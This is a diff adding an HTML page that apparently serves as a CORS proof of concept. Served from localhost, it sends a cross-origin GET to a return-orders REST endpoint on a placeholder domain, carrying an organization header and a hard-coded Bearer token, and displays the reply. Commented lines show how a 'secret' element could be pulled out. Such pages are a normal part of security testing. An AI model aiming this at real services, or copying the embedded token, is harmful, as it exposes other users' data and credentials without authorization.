@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<!-- Host this in localhost, start server with e.g. python -m http.server 80 and check if it is possible to fetch data from the target -->
+<html>
+<head>
+  <meta charset="utf-8" />
+  <script>
+    const url = 'https://domain.tld/rest/returnorders?sort_attribute=ArrivalDate&sort_direction=desc&offset=0&amount=10&return_search=123&store_id=0';
+    const options = {
+      method: 'GET',
+      mode: 'cors',
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+        "Userorganization": "Organization2",
+        "Authentication-Token": "XXXXXXsomeauthtokenvalueXXXXXX",
+        Authorization: "Bearer eLrw3eXlljyFRjaul5UoYZLNgpUeapbXSFKmLc5SVaBgv8azUtoKn7B062PjbYoS",
+        "User-Agent": "any-name"
+      }
+    }
+
+    function showResult(status, result) {
+      document.getElementById('status').textContent = status;
+      document.getElementById('result').textContent = result;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // https://developers.google.com/web/updates/2015/03/introduction-to-fetch
+      fetch(url, options)
+        .then(response => response.text())
+        .then(text => {
+          // const parser = new DOMParser();
+          // const doc = parser.parseFromString(text, 'text/html');
+          // const secret = doc.querySelector('.very-secret-element').innerHTML;
+          // showResult('Secret:', secret);
+          showResult('Success:', text);
+        })
+        .catch(error => {
+          console.error(error);
+          showResult('Error:', error);
+        });
+    });
+  </script>
+</head>
+<body>
+  <h2 id='status'>Fetching:</h2>
+  <code id='result'>...</code>
+</body>
+</html>
